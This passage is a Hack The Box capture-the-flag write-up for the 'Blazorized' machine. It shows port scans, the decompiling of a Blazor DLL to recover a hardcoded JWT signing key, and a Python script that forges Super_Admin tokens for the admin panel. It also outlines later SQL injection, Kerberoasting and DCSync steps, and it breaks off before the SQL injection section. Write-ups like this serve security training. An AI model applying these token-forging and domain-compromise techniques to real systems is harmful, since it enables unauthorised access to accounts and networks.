---
icon: java
---

# HTB-BLAZORIZED

<figure><img src="../../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

**1. Initial Access**

* Start at the **Blazor website**.
* Decompile relevant DLLs to extract the **JWT signing key**.
* Use the forged JWT to gain **access to the Admin area**.

**2. Execution**

* Exploit **SQL Injection** combined with **`xp_cmdshell`** to execute commands on the server.
* Gain a **shell as NU\_1055**.

**3. Privilege Escalation**

* Use **WriteSPN + Kerberoasting** to request a service ticket for **RSA\_4810**.
* Crack the ticket offline to retrieve the **password hash of RSA\_4810**.
* Use the credentials to get a **shell as RSA\_4810**.
* Modify **ScriptPath** to drop a malicious script, gaining a **shell as SSA\_6010**.
* Perform **DCSync** to dump all domain credentials, including the **Administrator hash**.

**Final Outcome:**

* With the Administrator credentials, gain full domain control and access the **root flag**.

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ rustscan BLAH BALAH BLAH
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.22:53
Open 10.10.11.22:80
Open 10.10.11.22:88
Open 10.10.11.22:135
Open 10.10.11.22:139
Open 10.10.11.22:389
Open 10.10.11.22:445
Open 10.10.11.22:464
Open 10.10.11.22:593
Open 10.10.11.22:636
Open 10.10.11.22:5985
Open 10.10.11.22:9389
Open 10.10.11.22:47001
Open 10.10.11.22:49666
Open 10.10.11.22:49664
Open 10.10.11.22:49665
Open 10.10.11.22:49667
Open 10.10.11.22:49674
Open 10.10.11.22:49672
Open 10.10.11.22:49675
Open 10.10.11.22:49680
Open 10.10.11.22:49701
Open 10.10.11.22:49710
Open 10.10.11.22:49770
Open 10.10.11.22:49776
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Discovered open port 135/tcp on 10.10.11.22
Discovered open port 389/tcp on 10.10.11.22
Discovered open port 49680/tcp on 10.10.11.22
Discovered open port 636/tcp on 10.10.11.22
Discovered open port 49665/tcp on 10.10.11.22
Discovered open port 49672/tcp on 10.10.11.22
Discovered open port 593/tcp on 10.10.11.22
Discovered open port 49710/tcp on 10.10.11.22
Discovered open port 88/tcp on 10.10.11.22
Discovered open port 49675/tcp on 10.10.11.22
Discovered open port 5985/tcp on 10.10.11.22
Discovered open port 49664/tcp on 10.10.11.22
Increasing send delay for 10.10.11.22 from 0 to 5 due to 11 out of 12 dropped probes since last increase.
Discovered open port 49666/tcp on 10.10.11.22
Discovered open port 464/tcp on 10.10.11.22
Discovered open port 49667/tcp on 10.10.11.22
Discovered open port 49776/tcp on 10.10.11.22
Discovered open port 49674/tcp on 10.10.11.22
Discovered open port 49701/tcp on 10.10.11.22
Discovered open port 9389/tcp on 10.10.11.22
Discovered open port 47001/tcp on 10.10.11.22
Discovered open port 445/tcp on 10.10.11.22
Discovered open port 49770/tcp on 10.10.11.22
Discovered open port 53/tcp on 10.10.11.22
Discovered open port 139/tcp on 10.10.11.22
Discovered open port 80/tcp on 10.10.11.22


PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Mozhar's Digital Garden
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 4ED916C575B07AD638ED9DBD55219AD5
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-18 12:03:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49770/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49776/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1115.00; RTM+
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T11:18:39
| Not valid after:  2055-08-18T11:18:39
| MD5:   39f3:7953:b78d:96d5:7029:2b5a:c4e5:09dd
| SHA-1: 2a13:034b:6486:1fb9:40a0:f1ac:032e:3ee7:bffe:f91a
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQWzuehhQZnJxDyhWDoS5qSjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwODE4MTExODM5WhgPMjA1NTA4MTgxMTE4MzlaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAMa6YmBH
| a4c7fGKJvaGs/83BgSk640oWfeL4QaswqA/y18ja7fij1FD8PEVwlvnZdU8Cl1Sh
| t23e6ztmUgExbA8MbLZcnCs69k/ri8DQJKei7mvVBk8hknYd2wwYdVj4kJd0YAr5
| fOpLxMMqWSiIoYRpjU88zbJqvx1JFlmBWf++CUaiMV0Q5+RTIlP0Kr2u7BFiJSbt
| iszwfLlq095FEJf6EGiiATiVDREW6vnVQMh7ZrZBvfDWJlFwmJJGfsAYWPtkGaip
| 78irzw5Zlg9kMx+QJYoggkhyV+gZWPe1b5oQ6FtXRfbAG06HyBfw24uptcEGe1pd
| Ub7KF7REhr7UhhOjNiG74fZuAURgtNaYt/sqjkKHUayqvbgNCWS5k9GnA6/TRRZ+
| AAjvtj0oEJ107VD9Jc1p/N3WjNsM3WpFOFWCI76aB1RxQu93y6N8Lv41iGx96oet
| eaM6LXGPvT8CXrHY3zUCuHXFf/rPt/CqmqKo/+ZWzjJOvgoMVCTpAyy2MQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQAg9RTtvRv4UGt2tp9NLNFhgkOFPJWuYHQL7m5d
| cqvA0ckI8xkwTUE4V3lhg9OyTCQLb2pwwA4rSLqnjGMPgN3z+EhbOwasraI07rqh
| hlnjtakW3auEQBb5Ip8uV4J8fDwY1reb0v3tU8s6NO0hxOp6Hm92g1gfQS6Ovq2X
| uDsJTx7HP6oYXe+0zjbQ8cIWCurJJXb45lTqZgllUU0FpVyOMAVQuaVz+HwnRZNP
| y5Yck9WcDiySByh7CENNq0KO0S/4oMXoBXiaoK3Cmz7PJ3HjZWWbKI6fTqLIbJzw
| OCKfAy7RW7jTN97unImx3D2/ydHhioJVpR2hDlzSoI2najVOFyOfgPIkuSk9alUk
| EyPgM0ZoldrRiKd3N1LuhQQLnIZX2/Qo76sfUrugxvRPYeqXoWe72nVeZ/gI4dRL
| v0Gc/8K7oCM9mXM0FCCqUt8T29zaKIud+sTi7KNnFmrj1xfSEJdBXZi294iqht4j
| cqFAYVADGcGW3Yx2FqzBiW83YmI=
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 49776
|_ssl-date: 2025-08-18T12:04:57+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1903 (93%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 (93%), Microsoft Windows 10 21H1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=53%CT=%CU=42978%PV=Y%DS=2%DC=T%G=N%TM=68A316ED%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10A%CI=I%II=I%TS=U)
SEQ(SP=FF%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49214/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62107/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35591/udp): CLEAN (Failed to receive data)
|   Check 4 (port 23471/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-08-18T12:04:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   260.25 ms 10.10.14.1
2   260.44 ms blazorized.htb (10.10.11.22)

```

The set of open ports (`53`, `88`, `389`, `445`) strongly suggested that the machine was operating as a Domain Controller. Nmap also highlighted two important findings: the domain `blazorized.htb` served over port `80`, and the hostname `dc1.blazorized.htb` associated with port `1433`. To make sure these resolved correctly during further testing, I mapped both to the target’s IP address in the `/etc/hosts` file

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ echo "10.10.11.22 blazorized.htb admin.blazorized.htb dc1.blazorized.htb" | sudo tee -a /etc/hosts

[sudo] password for sn0x: 
10.10.11.22 blazorized.htb admin.blazorized.htb dc1.blazorized.htb
```

<figure><img src="../../../../.gitbook/assets/Screenshot 2025-08-18 170933.png" alt=""><figcaption></figcaption></figure>

### WEBSITE - blazorized.htb

Accessing `blazorized.htb` over HTTP presented what appeared to be a personal wiki. In the footer, it was clearly mentioned that the site was powered by _Blazor WebAssembly_, a C# framework that enables building full-stack web applications without the need for JavaScript.

<figure><img src="../../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Besides a Markdown Playground—which could potentially be abused for XSS testing—the application also offered a _Check for Updates_ option. The accompanying note clarified that only administrators were allowed to interact with the API, but it suggested that regular users could temporarily impersonate the admin in a secure manner by pressing the button. Triggering this functionality simply resulted in a popup stating _Failed to Update Blazorized’s Content!_. Inspecting the browser’s network activity revealed that the request was directed toward an additional subdomain, `api.blazorized.htb`, which I then added to my `/etc/hosts` file for further testing.

<figure><img src="../../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Clicking the update button once more caused several new categories and posts to appear, though their contents did not seem to provide any useful information. What stood out instead, when reviewing the network activity, was that the application was loading a significant number of `.dll` files. Since Blazor is built on C#, these libraries could potentially contain portions of the source code. Using `wget`, I downloaded a selection of the more interesting DLLs and transferred them to my Windows VM for deeper analysis with dnSpy.

<figure><img src="../../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

I’ll focus on the ones with `Blazorized` in their name since the others are likely related to the framework itself. The file `http://blazorized.htb/_framework/blazor.boot.json` lists all resources and can be used to find **DLLs** even if they were not loaded yet.

```python
wget --quiet "http://blazorized.htb/_framework/Blazorized.DigitalGarden.dll"
wget --quiet "http://blazorized.htb/_framework/Blazorized.Shared.dll"
wget --quiet "http://blazorized.htb/_framework/Blazorized.Helpers.dll"
```

### SMB

Enumeration of port 445 with `netexec` confirmed that the target was part of the `blazorized.htb` domain, hosted on a system named `DC1` running Windows Server 2019 Build 17763 (x64). SMB signing was enforced, while SMBv1 was disabled. Attempts to enumerate shares without valid credentials were unsuccessful. Testing anonymous and guest sessions returned access errors, with the guest account specifically flagged as disabled. Supplying a random username also failed with a logon error, confirming that valid domain credentials would be required to proceed further.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ netexec smb blazorized.htb --shares
[*] Adding missing section 'BloodHound-CE' to nxc.conf
[*] Adding missing option 'bhce_enabled' in config section 'BloodHound-CE' to nxc.conf
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.22     445    DC1              [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
                                                                                                                                                         
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ netexec smb blazorized.htb -u sn0x -p '' --shares
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.22     445    DC1              [-] blazorized.htb\sn0x: STATUS_LOGON_FAILURE 

```

### FEROXBUSTER

To continue web enumeration, I launched `feroxbuster` against the target site. The scan completed without revealing any noteworthy directories or files, suggesting that no additional content was exposed through straightforward directory brute-forcing.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ feroxbuster -u http://blazorized.htb 
                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://blazorized.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       34l       82w     1542c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[#######>------------] - 58s    10697/30000   2m      found:0       errors:0      
[#######>------------] - 58s    10689/30000   184/s   http://blazorized.htb/
```

### BREACH POINT

Decompiling `Blazorized.Helpers.dll` revealed a function handling JWT creation and validation. The code disclosed the signing key used by the application, along with the required claims for token generation. Additionally, it exposed an email address—`superadmin@blazorized.htb`—associated with the privileged account. During this analysis, I also identified another subdomain, `admin.blazorized.htb`, which I added to my `/etc/hosts` file for further testing.

```python
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Runtime.CompilerServices;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;
 
namespace Blazorized.Helpers
{
	// Token: 0x02000007 RID: 7
	[NullableContext(1)]
	[Nullable(0)]
	public static class JWT
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002164 File Offset: 0x00000364
		private static SigningCredentials GetSigningCredentials()
		{
			SigningCredentials result;
			try
			{
				result = new SigningCredentials(new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JWT.jwtSymmetricSecurityKey)), "HS512");
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}
 
		// Token: 0x06000009 RID: 9 RVA: 0x000021A8 File Offset: 0x000003A8
		public static string GenerateTemporaryJWT(long expirationDurationInSeconds = 60L)
		{
			string result;
			try
			{
				List<Claim> list = new List<Claim>
				{
					new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
					new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.postsPermissionsClaimValue),
					new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.categoriesPermissionsClaimValue)
				};
				string text = JWT.issuer;
				string text2 = JWT.apiAudience;
				IEnumerable<Claim> enumerable = list;
				SigningCredentials signingCredentials = JWT.GetSigningCredentials();
				DateTime? dateTime = new DateTime?(DateTime.UtcNow.AddSeconds((double)expirationDurationInSeconds));
				JwtSecurityToken jwtSecurityToken = new JwtSecurityToken(text, text2, enumerable, null, dateTime, signingCredentials);
				result = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}
 
		// Token: 0x0600000A RID: 10 RVA: 0x00002258 File Offset: 0x00000458
		public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
		{
			string result;
			try
			{
				List<Claim> list = new List<Claim>
				{
					new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
					new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.superAdminRoleClaimValue)
				};
				string text = JWT.issuer;
				string text2 = JWT.adminDashboardAudience;
				IEnumerable<Claim> enumerable = list;
				SigningCredentials signingCredentials = JWT.GetSigningCredentials();
				DateTime? dateTime = new DateTime?(DateTime.UtcNow.AddSeconds((double)expirationDurationInSeconds));
				JwtSecurityToken jwtSecurityToken = new JwtSecurityToken(text, text2, enumerable, null, dateTime, signingCredentials);
				result = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}
 
		// Token: 0x0600000B RID: 11 RVA: 0x000022F4 File Offset: 0x000004F4
		public static bool VerifyJWT(string jwt)
		{
			bool result = false;
			try
			{
				TokenValidationParameters tokenValidationParameters = new TokenValidationParameters
				{
					ValidateIssuerSigningKey = true,
					IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JWT.jwtSymmetricSecurityKey)),
					ValidateIssuer = true,
					ValidIssuer = JWT.issuer,
					ValidateAudience = true,
					ValidAudiences = new string[]
					{
						JWT.apiAudience,
						JWT.adminDashboardAudience
					},
					ValidateLifetime = true,
					ClockSkew = TimeSpan.FromSeconds(10.0),
					ValidAlgorithms = new string[]
					{
						"HS512"
					}
				};
				try
				{
					SecurityToken securityToken;
					new JwtSecurityTokenHandler().ValidateToken(jwt, tokenValidationParameters, ref securityToken);
					result = true;
				}
				catch (Exception)
				{
				}
			}
			catch (Exception)
			{
			}
			return result;
		}
 
		// Token: 0x04000005 RID: 5
		private const long EXPIRATION_DURATION_IN_SECONDS = 60L;
 
		// Token: 0x04000006 RID: 6
		private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
 
		// Token: 0x04000007 RID: 7
		private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
 
		// Token: 0x04000008 RID: 8
		private static readonly string postsPermissionsClaimValue = "Posts_Get_All";
 
		// Token: 0x04000009 RID: 9
		private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";
 
		// Token: 0x0400000A RID: 10
		private static readonly string superAdminRoleClaimValue = "Super_Admin";
 
		// Token: 0x0400000B RID: 11
		private static readonly string issuer = "http://api.blazorized.htb";
 
		// Token: 0x0400000C RID: 12
		private static readonly string apiAudience = "http://api.blazorized.htb";
 
		// Token: 0x0400000D RID: 13
		private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
	}
}
```

By extracting the critical values from the decompiled code and incorporating them into a custom Python script, I was able to generate valid JWTs. These forged tokens could then be used as authentication cookies, granting access to the admin panel

gen.py

```python
#!/usr/bin/env python3
# pip install pyjwt
import jwt
 
from datetime import datetime, timedelta, UTC
 
signing_key = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
 
payload = {
        'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress': 'superadmin@blazorized.htb',
        'http://schemas.microsoft.com/ws/2008/06/identity/claims/role': 'Super_Admin',
        'iss': 'http://api.blazorized.htb',
        'aud': 'http://admin.blazorized.htb',
        'exp': datetime.now(UTC) + timedelta(seconds=3600)
        }
 
token = jwt.encode(payload, signing_key, algorithm='HS512')
print(token)


```

Visiting `admin.blazorized.htb` presented a login screen for the Super Admin account. However, the previously reviewed source code did not make it clear how the JWT should be provided for authentication. Drawing from the temporary token used by the update feature, I first attempted to include the JWT as an HTTP header (`Authorization: Bearer <JWT>`). This method failed, as the admin interface did not accept the token in that format.

<figure><img src="../../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

Examining the **Blazor** traffic with the [Blazor Traffic Processor](https://github.com/portswigger/blazor-traffic-processor) in **BurpSuite** shows a reference to the localstorage. A key called `jwt` is queried, so this looks very promising.

<figure><img src="../../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

### SQL Injection <a href="#privilege-escalation" id="privilege-escalation"></a>

It looks like the **GenerateSuperAdminJWT** function is responsible for creating the JWT used on `admin.blazorized.htb`. To test this, I’ll make a small Python script that copies the logic from the C# code, but I’ll set a longer expiration time for convenience.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ cat gen.py
import jwt
from time import time

secret = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
data = {
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin",
    "iss": "http://api.blazorized.htb",
    "aud": "http://admin.blazorized.htb",
    "exp": int(time() + 60 * 60 * 24 * 10),
}

token = jwt.encode(data, secret, algorithm='HS512')

print(token)
                                                                                                                                                         
┌──(sn0x㉿sn0x)-[~/HTB/Blazorized]
└─$ python3 gen.py
